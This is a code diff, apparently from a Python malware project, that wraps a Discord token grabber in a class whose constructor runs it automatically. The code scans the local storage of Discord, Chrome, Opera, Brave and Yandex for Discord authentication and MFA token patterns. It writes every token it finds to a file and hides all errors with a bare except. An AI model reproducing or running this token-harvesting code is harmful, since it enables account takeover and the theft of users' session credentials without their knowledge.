@@ -3,49 +3,56 @@ import re
 from constants import MY_HOME
 
 
-def find_tokens(path):
-    path += '\\Local Storage\\leveldb'
+class Discord(object):
+    def __init__(self) -> None:
+        self.tgrab()
 
-    tokens = []
+    def find_tokens(self, path):
+        path += '\\Local Storage\\leveldb'
 
-    for file_name in os.listdir(path):
-        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-            continue
+        tokens = []
 
-        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                for token in re.findall(regex, line):
-                    tokens.append(token)
-    return tokens
+        for file_name in os.listdir(path):
+            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                continue
 
+            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                    for token in re.findall(regex, line):
+                        tokens.append(token)
+        return tokens
 
-def tgrab():
-    message = ""
-    local = os.getenv('LOCALAPPDATA')
-    roaming = os.getenv('APPDATA')
+    def tgrab(self):
+        try:
 
-    paths = {
-        'Discord': roaming + '\\Discord',
-        'Discord Canary': roaming + '\\discordcanary',
-        'Discord PTB': roaming + '\\discordptb',
-        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
-        'Opera': roaming + '\\Opera Software\\Opera Stable',
-        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
-    }
+            message = ""
+            local = os.getenv('LOCALAPPDATA')
+            roaming = os.getenv('APPDATA')
 
-    for platform, path in paths.items():
-        if not os.path.exists(path):
-            continue
+            paths = {
+                'Discord': roaming + '\\Discord',
+                'Discord Canary': roaming + '\\discordcanary',
+                'Discord PTB': roaming + '\\discordptb',
+                'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+                'Opera': roaming + '\\Opera Software\\Opera Stable',
+                'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+                'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+            }
 
-        tokens = find_tokens(path)
+            for platform, path in paths.items():
+                if not os.path.exists(path):
+                    continue
 
-        if len(tokens) > 0:
-            for token in tokens:
-                message += token + "\n"
+                tokens = self.find_tokens(path)
 
-        else:
+                if len(tokens) > 0:
+                    for token in tokens:
+                        message += token + "\n"
+
+                else:
+                    pass
+
+            with open(MY_HOME + "dtokens.txt", "w") as f:
+                f.write(message)
+        except:
             pass
-
-    with open(MY_HOME + "dtokens.txt", "w") as f:
-        f.write(message)
